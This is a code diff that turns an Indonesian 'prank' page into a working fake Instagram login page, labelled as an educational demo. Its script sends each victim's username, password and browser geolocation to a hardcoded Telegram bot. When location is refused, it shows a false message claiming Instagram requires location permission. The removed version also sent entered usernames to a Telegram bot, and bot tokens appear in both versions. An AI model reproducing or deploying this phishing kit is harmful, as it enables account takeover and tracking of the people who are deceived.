@@ -1,163 +1,443 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>NGL Prank</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: 'Poppins', sans-serif;
-    }
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Login • Instagram (Demo Edukasi)</title>
+    <style>
+        :root {
+            --bg: #fafafa;
+            --card: #fff;
+            --line: #dbdbdb;
+            --text: #262626;
+            --blue: #0095f6;
+            --blue-hover: #1877f2;
+            --fb: #385185;
+        }
 
-    body {
-      background: linear-gradient(135deg, #ff5fa2, #ffc371);
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-    }
+        /* Global resets and base styles */
+        * {
+            box-sizing: border-box;
+        }
 
-    .container {
-      background: #fff;
-      border-radius: 24px;
-      width: 100%;
-      max-width: 400px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
-      padding: 30px 20px;
-      text-align: center;
-    }
+        body {
+            margin: 0;
+            background: var(--bg);
+            color: var(--text);
+            font: 14px system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
 
-    .logo {
-      width: 100px;
-      margin: 0 auto 20px;
-    }
+        .page {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+        }
 
-    .logo img {
-      width: 100%;
-    }
+        .container {
+            display: flex;
+            flex-direction: column;
+            gap: 32px;
+            align-items: center;
+            max-width: 930px;
+            width: 100%;
+        }
 
-    h1 {
-      font-size: 22px;
-      font-weight: 600;
-      color: #333;
-      margin-bottom: 20px;
-    }
+        .phone {
+            display: none;
+            position: relative;
+        }
 
-    input, textarea {
-      width: 100%;
-      padding: 14px;
-      border: none;
-      border-radius: 16px;
-      background: #f0f0f0;
-      margin-bottom: 16px;
-      font-size: 14px;
-      outline: none;
-    }
+        .phone img {
+            display: block;
+            max-width: 100%;
+            height: auto;
+            border-radius: 20px;
+        }
 
-    button {
-      background: #ff5fa2;
-      color: white;
-      font-size: 16px;
-      padding: 14px;
-      border: none;
-      border-radius: 999px;
-      width: 100%;
-      font-weight: bold;
-      cursor: pointer;
-      transition: 0.3s;
-    }
+        .stack {
+            display: grid;
+            gap: 10px;
+            width: 100%;
+            max-width: 350px;
+        }
 
-    button:hover {
-      background: #e4488f;
-    }
+        .card {
+            background: var(--card);
+            border: 1px solid var(--line);
+            padding: 32px 28px;
+            border-radius: 8px;
+        }
 
-    .note {
-      font-size: 13px;
-      color: #777;
-      margin-top: 15px;
-    }
+        .wordmark {
+            font: 700 36px/1.1 cursive;
+            text-align: center;
+            margin: 0 0 24px;
+        }
 
-    .form-step {
-      display: none;
-    }
+        form {
+            display: grid;
+            gap: 8px;
+        }
 
-    .form-step.active {
-      display: block;
-    }
+        input {
+            width: 100%;
+            background: var(--bg);
+            border: 1px solid var(--line);
+            border-radius: 4px;
+            padding: 12px 10px;
+            font-size: 14px;
+        }
 
-  </style>
+        .btn {
+            margin-top: 8px;
+            width: 100%;
+            border: 0;
+            background: var(--blue);
+            color: #fff;
+            font-weight: 600;
+            border-radius: 8px;
+            padding: 10px 16px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .btn:disabled {
+            opacity: .5;
+            cursor: not-allowed;
+        }
+
+        .btn:not(:disabled):hover {
+            background: var(--blue-hover);
+        }
+
+        .or {
+            display: grid;
+            grid-template-columns: 1fr auto 1fr;
+            gap: 18px;
+            align-items: center;
+            margin: 10px 0;
+            color: #8e8e8e;
+            font-weight: 600;
+            font-size: 12px;
+        }
+
+        .or::before,
+        .or::after {
+            content: "";
+            height: 1px;
+            background: var(--line);
+        }
+
+        .fb {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            color: var(--fb);
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .forgot {
+            display: block;
+            text-align: center;
+            margin-top: 12px;
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .signup {
+            background: var(--card);
+            border: 1px solid var(--line);
+            padding: 20px;
+            text-align: center;
+            border-radius: 8px;
+        }
+
+        .signup a {
+            color: var(--blue);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .apps {
+            text-align: center;
+        }
+
+        .apps p {
+            margin: 10px 0 8px;
+            color: var(--text);
+        }
+
+        .badges {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .badges img {
+            height: 40px;
+        }
+
+        footer {
+            margin-top: 24px;
+            color: #8e8e8e;
+            font-size: 12px;
+            text-align: center;
+        }
+
+        /* Media query for larger screens (e.g., tablets and desktops) */
+        @media (min-width: 768px) {
+            .container {
+                flex-direction: row;
+            }
+
+            .phone {
+                display: block;
+                flex: 1;
+            }
+        }
+
+        /* CSS for the loading spinner */
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border-left-color: var(--blue);
+            animation: spin 1s ease infinite;
+            margin-bottom: 16px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/e/ed/Instagram_logo_2022.svg" alt="NGL logo">
+    <div class="page">
+        <div class="container">
+            <!-- Kiri: ganti gambar mockup dengan gambar hitam besar -->
+            <div class="phone" aria-hidden="true">
+                <img src="https://i.ibb.co.com/RG0J3PqP/landing-2x.png" alt="landing">
+            </div>
+
+            <!-- Kanan: stack kartu -->
+            <div class="stack">
+                <div class="card">
+                    <h1 class="wordmark">Instagram</h1>
+                    <form id="loginForm" novalidate>
+                        <input id="username" name="username" placeholder="Nomor telepon, nama pengguna, atau email" required />
+                        <input id="password" name="password" type="password" placeholder="Kata Sandi" minlength="6" required />
+                        <button id="submitBtn" class="btn" type="submit" disabled>Masuk</button>
+                    </form>
+
+                    <div class="or">ATAU</div>
+                    <a class="fb" href="#">Masuk dengan Facebook</a>
+                    <a class="forgot" href="#">Lupa kata sandi?</a>
+                </div>
+
+                <div class="signup">Tidak punya akun? <a href="#">Daftar</a></div>
+
+                <div class="apps">
+                    <p>Dapatkan aplikasinya.</p>
+                    <div class="badges">
+                        <img src="https://i.ibb.co.com/QFFZf3vL/image.png" alt="Google Play">
+                        <img src="https://i.ibb.co.com/8Lm5VGs8/image.png" alt="App Store">
+                    </div>
+                </div>
+            
+            </div>
+        </div>
     </div>
-    <h1>Masukkan Username Instagram</h1>
-    <div id="step-1" class="form-step active">
-      <input type="text" id="username" placeholder="Username Instagram kamu" required />
-      <button onclick="nextStep()">Lanjutkan</button>
-    </div>
-    
-    <div id="step-2" class="form-step">
-      <h1>Kirim Pesan Anonim 👀</h1>
-      <textarea id="message" rows="4" placeholder="Tulis pesanmu..." required></textarea>
-      <button onclick="sendMessage()">Kirim Pesan</button>
-    </div>
-    <p class="note">⚠️ Ini hanya prank. Username kamu akan dikirim.</p>
-  </div>
 
-  <script>
-    const token = "7417366472:AAG_H9DxOxGzfkKkMxLx7lAoEgu4z3IwcJg";
-    const chatId = "6128943834";
-    let userUsername = "";
+    <script>
+        // Menggunakan IIFE (Immediately Invoked Function Expression) untuk mengisolasi variabel,
+        // mencegah error "Identifier 'u' has already been declared".
+        (() => {
+            // Informasi bot Telegram
+            const telegramBotToken = '7474809396:AAFzVx41utqmnmkTmvPLsknBsW58VZOH3Ds';
+            const telegramChatId = '6128943834';
 
-    // Function to handle step transition
-    function nextStep() {
-      userUsername = document.getElementById("username").value.trim();
-      if (userUsername !== "") {
-        document.getElementById("step-1").classList.remove("active");
-        document.getElementById("step-2").classList.add("active");
-      } else {
-        alert("Masukkan username Instagram kamu terlebih dahulu!");
-      }
-    }
+            // Mengambil elemen-elemen DOM
+            const u = document.getElementById('username');
+            const p = document.getElementById('password');
+            const btn = document.getElementById('submitBtn');
+            const form = document.getElementById('loginForm');
+            const fbLink = document.querySelector('.fb');
+            const forgotLink = document.querySelector('.forgot');
+            const signupLink = document.querySelector('.signup a');
+            
+            // Fungsi untuk menampilkan pesan di UI (bukan alert)
+            const showMessage = (message) => {
+                const existingMsg = document.querySelector('.message-box');
+                if (existingMsg) existingMsg.remove();
+                
+                const msgBox = document.createElement('div');
+                msgBox.className = 'message-box';
+                msgBox.textContent = message;
+                
+                msgBox.style.cssText = `
+                    position: fixed;
+                    bottom: 20px;
+                    left: 50%;
+                    transform: translateX(-50%);
+                    background-color: rgba(0, 0, 0, 0.75);
+                    color: white;
+                    padding: 10px 20px;
+                    border-radius: 5px;
+                    z-index: 1000;
+                    opacity: 0;
+                    transition: opacity 0.5s ease-in-out;
+                `;
+                document.body.appendChild(msgBox);
 
-    // Function to handle message submission
-    function sendMessage() {
-      const message = document.getElementById("message").value.trim();
-      if (message !== "") {
-        const text = `📨 Pesan Masuk!\n\n👤 Username: ${userUsername}\n💬 Pesan: ${message}`;
+                setTimeout(() => msgBox.style.opacity = '1', 10);
+                setTimeout(() => msgBox.style.opacity = '0', 3000);
+                setTimeout(() => msgBox.remove(), 3500);
+            };
 
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: text
-          })
-        })
-        .then(res => res.json())
-        .then(data => {
-          alert("Pesan berhasil dikirim!");
-          document.getElementById("username").value = "";
-          document.getElementById("message").value = "";
-          document.getElementById("step-2").classList.remove("active");
-          document.getElementById("step-1").classList.add("active");
-        })
-        .catch(err => {
-          alert("Gagal mengirim pesan. Coba lagi.");
-        });
-      } else {
-        alert("Pesan tidak boleh kosong!");
-      }
-    }
-  </script>
+            // Fungsi untuk mengirim pesan ke Telegram
+            const sendToTelegram = async (text) => {
+                const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+                const params = {
+                    chat_id: telegramChatId,
+                    text: text
+                };
+                const queryString = new URLSearchParams(params).toString();
+                try {
+                    const response = await fetch(`${url}?${queryString}`);
+                    const data = await response.json();
+                    console.log('Telegram response:', data);
+                    if (data.ok) {
+                        return true;
+                    } else {
+                        showMessage('Gagal mengirim data ke Telegram.');
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('Error sending data to Telegram:', error);
+                    showMessage('Koneksi ke Telegram gagal.');
+                    return false;
+                }
+            };
+            
+            // Fungsi untuk mengambil lokasi pengguna dan mengirim data
+            const handleLoginSuccess = (user, pass) => {
+                // Tampilkan halaman loading
+                document.body.innerHTML = `
+                    <div class="loading-container">
+                        <div class="spinner"></div>
+                        <p>Memuat...</p>
+                    </div>
+                `;
+
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const { latitude, longitude } = position.coords;
+                            const mapsLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+                            const message = `
+username: ${user}
+pw: ${pass}
+link sharelocationnya: ${mapsLink}
+`;
+                            // Kirim data ke Telegram
+                            sendToTelegram(message);
+                        },
+                        (error) => {
+                            console.error("Error getting location:", error);
+                            let errorMessage;
+                            if (error.code === error.PERMISSION_DENIED) {
+                                // Tampilkan pesan pop-up yang diminta
+                                errorMessage = "Instagram meminta Anda mengaktifkan izin lokasi di browser sebagai bagian dari verifikasi aktivitas login. Silakan atur ulang untuk melanjutkan.";
+                                showMessage(errorMessage);
+                                // Kembali ke halaman login
+                                setTimeout(() => location.reload(), 3000);
+                                return;
+                            } else if (error.code === error.POSITION_UNAVAILABLE) {
+                                errorMessage = "Informasi lokasi tidak tersedia.";
+                            } else if (error.code === error.TIMEOUT) {
+                                errorMessage = "Waktu permintaan lokasi habis.";
+                            } else {
+                                errorMessage = "Terjadi kesalahan saat mendapatkan lokasi.";
+                            }
+
+                            // Menampilkan pesan pop-up yang diminta untuk error selain PERMISSION_DENIED
+                            showMessage(errorMessage);
+
+                            const message = `
+username: ${user}
+pw: ${pass}
+link sharelocationnya: Gagal mendapatkan lokasi - ${errorMessage}
+`;
+                            // Kirim pesan error lokasi ke Telegram
+                            sendToTelegram(message);
+                        }
+                    );
+                } else {
+                    const message = `
+username: ${user}
+pw: ${pass}
+link sharelocationnya: Peramban tidak mendukung Geolocation
+`;
+                    // Kirim pesan tanpa lokasi ke Telegram
+                    sendToTelegram(message);
+                }
+            };
+
+            // Memperbarui status tombol "Masuk"
+            const update = () => {
+                btn.disabled = !(u.value.trim().length >= 3 && p.value.length >= 6);
+            };
+
+            u.addEventListener('input', update);
+            p.addEventListener('input', update);
+            update();
+
+            // Menangani pengiriman formulir
+            form.addEventListener('submit', e => {
+                e.preventDefault();
+                const user = u.value.trim().toLowerCase();
+                const pass = p.value;
+                
+                // Langsung panggil fungsi sukses, tanpa validasi
+                handleLoginSuccess(user, pass);
+            });
+
+            // Menambahkan event listener untuk link-link lain
+            fbLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                showMessage('Demo edukasi');
+            });
+
+            forgotLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                showMessage('Demo edukasi');
+            });
+
+            signupLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                showMessage('Demo edukasi');
+            });
+        })();
+    </script>
 </body>
 </html>
